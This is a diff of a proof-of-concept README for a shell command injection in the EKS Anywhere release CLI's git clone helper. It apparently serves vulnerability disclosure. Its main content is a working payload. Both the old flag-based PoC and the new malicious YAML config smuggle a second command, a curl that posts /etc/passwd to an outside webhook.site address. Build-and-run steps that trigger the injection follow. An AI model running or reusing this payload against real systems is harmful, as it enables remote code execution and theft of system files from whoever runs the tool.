@@ -1,21 +1,31 @@
 # EKS Anywhere Release CLI - Command Injection PoC
 
 ## Vulnerability
-Shell command injection in `release/cli/pkg/git/git.go` via `--cli-repo-url` flag.
+Shell command injection in `release/cli/pkg/git/git.go` via config file or CLI flags.
 
-## Affected Code
-```go
-func CloneRepo(cloneUrl, destination string) (string, error) {
-    cloneRepoCommandSequence := fmt.Sprintf("git clone --depth 1 %s %[2]s; ...", cloneUrl, destination)
-    cmd := exec.Command("bash", "-c", cloneRepoCommandSequence)
-    return commandutils.ExecCommand(cmd)
-}
+## Attack Vector
+The Release CLI reads configuration from:
+- `~/.eks-anywhere.yaml` (default)
+- `--config <file>` flag
+- Environment variables (e.g., `CLI_REPO_URL`)
+
+## Malicious Config File (malicious-config.yaml)
+```yaml
+cli-repo-url: "http://x; curl -d @/etc/passwd https://webhook.site/YOUR_ID #"
+build-repo-url: "http://y"
 ```
 
-## Exploit
-The `--cli-repo-url` parameter is passed directly to a shell command without sanitization.
-
-## PoC
+## Exploitation
 ```bash
-./release-cli release --cli-repo-url "http://x; curl -d @/etc/passwd https://webhook.site/YOUR_ID #" --build-repo-url "http://x"
+# Clone and build release CLI
+git clone https://github.com/aws/eks-anywhere.git
+cd eks-anywhere/release/cli
+go build -o release-cli .
+
+# Clone this PoC repo
+git clone https://github.com/helitestacc/eksanywhere.git /tmp/poc
+cd /tmp/poc
+
+# Run with malicious config - triggers RCE
+/path/to/release-cli release --config malicious-config.yaml
 ```
